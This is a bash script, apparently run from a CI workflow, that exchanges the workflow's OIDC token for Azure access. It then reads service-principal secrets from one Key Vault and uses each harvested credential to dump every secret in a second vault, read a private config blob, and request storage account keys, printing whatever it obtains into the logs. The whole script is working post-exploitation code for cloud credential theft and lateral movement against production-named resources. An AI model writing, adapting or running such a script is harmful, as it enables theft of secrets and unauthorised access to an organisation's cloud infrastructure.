#!/usr/bin/env bash
set -x

OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
echo "KV len: ${#KV}"

# Try ALL SPs from kv-tbl-prod on kv-tbl-sec (RBAC vault)
for SP in secrets-sync-principal sync-service-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  echo "=== $SP on kv-tbl-sec ==="
  SPSEC=$(curl -s -H "Authorization: Bearer $KV" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  SA=$(echo "$SPSEC"|jq -r .appId); SK=$(echo "$SPSEC"|jq -r .clientSecret)
  SPKV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
    --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
  echo "$SP kv-token len: ${#SPKV}"
  if [ ${#SPKV} -gt 100 ]; then
    echo "--- list secrets ---"
    curl -s -H "Authorization: Bearer $SPKV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq .
    echo "--- get each secret ---"
    SIDS=$(curl -s -H "Authorization: Bearer $SPKV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -r '.value[]?.id // empty')
    for SID in $SIDS; do
      echo ">>> $SID"
      curl -s -H "Authorization: Bearer $SPKV" "$SID?api-version=7.4" | jq -r .value
    done
  fi

  # Also try storage with this SP
  SPST=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
    --data-urlencode "scope=https://storage.azure.com/.default" | jq -r .access_token)
  if [ ${#SPST} -gt 100 ]; then
    R=$(curl -s -H "Authorization: Bearer $SPST" -H "x-ms-version: 2021-08-06" \
      "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json")
    echo "$SP storage read: $R" | head -c 500
    echo
  fi

  # Try MGMT listKeys with this SP
  SPMG=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$SA" -d "grant_type=client_credentials" -d "client_secret=$SK" \
    --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
  if [ ${#SPMG} -gt 100 ]; then
    LK=$(curl -s -X POST -H "Authorization: Bearer $SPMG" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01")
    echo "$SP listKeys: $LK" | head -c 500
    echo
    # If listKeys worked, read storage with account key
    KEY1=$(echo "$LK" | jq -r '.keys[0].value // empty')
    if [ -n "$KEY1" ] && [ "$KEY1" != "null" ]; then
      echo "=== GOT STORAGE KEY: $KEY1 ==="
      # Read with shared key
      DT=$(date -u +"%a, %d %b %Y %H:%M:%S GMT")
      curl -s -H "x-ms-date: $DT" -H "x-ms-version: 2021-08-06" -H "Authorization: SharedKey sttblappcfgprodx3euoz:TODO" \
        "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json"
    fi
  fi
done

echo "=== DONE ==="
